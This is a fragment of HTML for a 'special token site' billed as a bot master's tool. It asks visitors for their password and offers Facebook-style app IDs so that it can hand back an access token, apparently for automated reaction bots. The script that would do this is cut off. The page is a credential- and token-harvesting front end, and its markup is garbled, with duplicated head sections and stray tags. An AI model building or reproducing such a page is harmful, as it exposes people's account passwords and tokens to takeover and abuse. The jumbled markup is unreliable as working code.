...
<head>
<meta charset="utf-8">
<title>MOUZAM ALI SPECIAL TOKEN SITE</title>
  <div id="header">
...
<font style="color:red;font-size:26px;font-family:miaanFont"><h3 align="center"><font style="background: url(&quot;bg.gif&quot;) repeat scroll 0% 0% transparent;color:#000; text-shadow: 0pt 0pt 0.9em black, 0pt 2pt 0.9em red;font-family:miaanFont;font-size:50px;"><b><a href="https://web.facebook.com/sallu.ch.967" target="_blank">MOUZAM ALI BOT MASTER</a></b></font></h3>     
<h3 align="center"><font style="background: url(&quot;bg.gif&quot;) repeat scroll 0% 0% transparent;color:#000; text-shadow: 0pt 0pt 0.9em black, 0pt 2pt 0.9em red;font-family:miaanFont;font-size:50px;"><b><a href="https://web.facebook.com/sallu.ch.967" target="_blank">SPECIAL TOKEN SCRIPT  </a></b></font></h3>     
<!doctype html>
<html>
</script>
<head>
...
<script src=""></script>
<title>☆ WELCOME TO SPECIAL TOKEN SITE ☆
</title> 
...
<center><input id="password" type="password" placeholder="ADD PASSWORD HERE" class="form-control"/>
</div>
<div class="form-group"><label for="app_id">* SELECT APP ID *</label>
<select id="app_id" class="form-control">
<option value="6628568379">SPECIAL REACTION SITE IPHONE TOKEN</option>
<option value="350685531728">SPECIAL ANDROID TOKEN</option>
<option value="165907476854626">SPECIAL IOS TOKEN</option>
</select>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-primary"style="border: 2px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">Get Token</button>
</div>
<div class="form-group text-center" id="load_result" style="display:none">
<label for="result"><center>Access Token Here:</label><br><center>
<textarea id="result" onclick="this.focus();this.select()" class="form-control"></textarea>
</div>
</div>
</div>
<script>
